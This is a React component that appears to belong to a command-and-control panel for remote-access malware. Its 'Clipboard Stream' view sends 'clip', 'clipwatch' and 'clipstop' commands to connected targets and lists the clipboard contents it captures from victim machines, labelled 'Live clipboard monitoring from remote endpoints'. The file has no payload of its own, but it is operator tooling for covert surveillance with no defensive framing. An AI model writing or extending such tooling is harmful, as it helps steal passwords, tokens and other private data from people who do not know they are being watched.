import { Clipboard, Copy } from 'lucide-react';
import type { CommandLog } from '../types';

interface ClipboardViewProps {
  logs: CommandLog[];
  clients: { id: string }[];
  executeCommand: (cmd: string, silent?: boolean) => void;
}

export default function ClipboardView({ logs, clients, executeCommand }: ClipboardViewProps) {
  const clipEntries = logs
    .filter(l => l.status === 'SUCCESS' && (l.command === 'clip' || l.command === 'clipwatch' || l.command.startsWith('clip')))
    .filter(l => !l.output.startsWith('[JSON_') && l.output.trim().length > 0)
    .map(l => ({
      id: l.id,
      client: l.client_id,
      content: l.output.trim(),
      timestamp: l.timestamp,
    }))
    .reverse();

  const isWatching = (() => {
    let watching = false;
    for (const l of logs) {
      if (l.status === 'SUCCESS' && l.command === 'clipwatch') watching = true;
      if (l.status === 'SUCCESS' && l.command === 'clipstop') watching = false;
    }
    return watching;
  })();

  return (
    <div className="h-full flex flex-col space-y-3">
      <div className="flex items-center justify-between">
        <div>
          <h2 className="text-sm font-bold text-white uppercase tracking-wider">Clipboard Stream</h2>
          <p className="text-[11px] text-slate-400 mt-0.5">Live clipboard monitoring from remote endpoints</p>
        </div>
        <div className="flex items-center space-x-2">
          <button
            onClick={() => executeCommand('clip')}
            disabled={clients.length === 0}
            className="px-3 py-1.5 bg-c2pill border border-c2border hover:border-c2accent text-xs font-medium text-slate-300 hover:text-white rounded-md flex items-center space-x-1.5 transition-colors disabled:opacity-40 disabled:cursor-not-allowed"
          >
            <Clipboard className="w-3 h-3" />
            <span>Grab Once</span>
          </button>
          <button
            onClick={() => executeCommand(isWatching ? 'clipstop' : 'clipwatch')}
            disabled={clients.length === 0}
            className={`px-3 py-1.5 text-xs font-semibold rounded-md flex items-center space-x-1.5 border transition-colors disabled:opacity-40 disabled:cursor-not-allowed ${
              isWatching
                ? 'bg-rose-500/10 text-rose-400 border-rose-500/30 hover:bg-rose-500/20'
                : 'bg-emerald-500/10 text-emerald-400 border-emerald-500/30 hover:bg-emerald-500/20'
            }`}
          >
            <span className={`w-1.5 h-1.5 rounded-full ${isWatching ? 'bg-rose-400 animate-pulse' : 'bg-emerald-400'}`} />
            <span>{isWatching ? 'Stop Monitor' : 'Start Monitor'}</span>
          </button>
        </div>
      </div>

      {isWatching && (
        <div className="flex items-center space-x-2 px-3 py-2 bg-emerald-500/5 border border-emerald-500/20 rounded-lg text-[11px] text-emerald-400">
          <span className="w-1.5 h-1.5 rounded-full bg-emerald-400 animate-pulse shrink-0" />
          <span>Live clipboard monitor is active — every clipboard change on the target will appear below</span>
        </div>
      )}

      <div className="flex-1 bg-c2card border border-c2border rounded-xl overflow-y-auto">
        {clipEntries.length === 0 ? (
          <div className="h-full flex flex-col items-center justify-center space-y-3 text-slate-500 p-12">
            <Clipboard className="w-10 h-10 opacity-20" />
            <div className="text-xs text-center space-y-1">
              <p className="font-semibold">No clipboard data yet</p>
              <p className="text-slate-600">Use <span className="font-mono text-slate-400">Grab Once</span> for a one-time capture, or <span className="font-mono text-slate-400">Start Monitor</span> to stream changes live</p>
            </div>
          </div>
        ) : (
          <div className="divide-y divide-c2border">
            {clipEntries.map((entry) => (
              <div key={entry.id} className="p-3.5 hover:bg-c2pill/40 transition-colors group">
                <div className="flex items-start justify-between gap-3">
                  <div className="flex items-start space-x-2.5 min-w-0 flex-1">
                    <div className="mt-0.5 p-1.5 rounded-md bg-amber-500/10 border border-amber-500/20 shrink-0">
                      <Clipboard className="w-3 h-3 text-amber-400" />
                    </div>
                    <div className="min-w-0 flex-1">
                      <div className="flex items-center space-x-2 mb-1">
                        <span className="text-[9px] font-bold uppercase tracking-wider px-1.5 py-0.5 rounded bg-amber-500/10 border border-amber-500/20 text-amber-400">CLIPBOARD</span>
                        <span className="text-[10px] font-mono text-slate-500">{entry.client}</span>
                        <span className="text-[10px] font-mono text-slate-600">{entry.timestamp.split(' ')[1] || entry.timestamp}</span>
                      </div>
                      <pre className="text-xs text-slate-200 font-mono whitespace-pre-wrap break-all leading-relaxed max-h-32 overflow-y-auto">{entry.content}</pre>
                    </div>
                  </div>
                  <button
                    onClick={() => navigator.clipboard.writeText(entry.content)}
                    className="shrink-0 p-1.5 rounded-md text-slate-500 hover:text-white hover:bg-c2pill border border-transparent hover:border-c2border transition-colors opacity-0 group-hover:opacity-100"
                    title="Copy to local clipboard"
                  >
                    <Copy className="w-3 h-3" />
                  </button>
                </div>
              </div>
            ))}
          </div>
        )}
      </div>

      <div className="text-[10px] text-slate-600 font-mono">
        {clipEntries.length} capture{clipEntries.length !== 1 ? 's' : ''} recorded this session
      </div>
    </div>
  );
}
